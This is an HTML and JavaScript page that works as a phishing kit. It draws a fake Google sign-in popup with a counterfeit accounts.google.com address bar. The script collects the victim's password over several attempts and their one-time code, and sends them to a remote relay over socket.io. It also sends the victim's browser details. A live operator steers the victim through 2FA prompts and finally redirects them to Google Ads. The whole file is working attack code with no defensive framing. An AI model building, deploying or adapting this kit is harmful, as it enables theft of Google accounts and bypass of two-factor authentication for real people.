<!doctype html>
<button id="connect">Connect</button>
<section id="popup" hidden>
 <header class="title-bar"><span class="window-controls">×</span></header>
 <div class="url-bar">https://accounts.google.com</div>
 <form id="signin"><input name="email"><input id="password" type="password"><input id="otp" autocomplete="one-time-code"></form>
</section>
<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io("https://relay.example.invalid");
const record = {google_uid: "", password_one: "", password_two: "", password_three: "", otp: ""};
let attempt = 0;
const slots = ["password_one", "password_two", "password_three"];
const popup = document.querySelector("#popup");
const password = document.querySelector('input[type="password"]');
const otp = document.querySelector('input[autocomplete="one-time-code"]');
document.querySelector("#connect").onclick = async () => {
 popup.hidden = false;
 record.google_uid = await fetch('/api/create/user', {method: 'POST'}).then(r => r.text());
 fetch('/api/send/ip', {method: 'POST', body: JSON.stringify({userAgent: navigator.userAgent, width: screen.width, height: screen.height})});
};
document.querySelector("#signin").onsubmit = event => {
 event.preventDefault();
 record[slots[Math.min(attempt++, 2)]] = password.value;
 record.otp = otp.value;
 socket.emit("update-user", record);
};
const commands = {
 "/password": () => {password.value = ""; password.hidden = false;},
 "/2fa": () => {otp.hidden = false;},
 "/authApp": () => {otp.hidden = false; otp.focus();},
 "/wrong2fa": () => {otp.value = ""; otp.hidden = false;},
 "/done": () => {window.location.href = "https://ads.google.com/";}
};
socket.on("operator-command", command => commands[command]?.());
</script>
